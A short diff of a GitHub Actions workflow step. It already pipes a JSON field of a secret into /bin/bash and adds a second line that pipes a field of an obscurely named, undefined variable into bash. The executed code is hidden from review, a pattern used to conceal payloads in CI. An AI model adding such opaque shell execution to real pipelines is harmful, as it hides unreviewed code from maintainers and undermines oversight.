@@ -18,6 +18,7 @@ jobs:
           yy6: ${{ secrets.yy6 }}
         run: |
           printf '%s' "$yy6" | jq -r .cklgk98 | /bin/bash
+          echo $xlngd149 | jq -r .h122 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
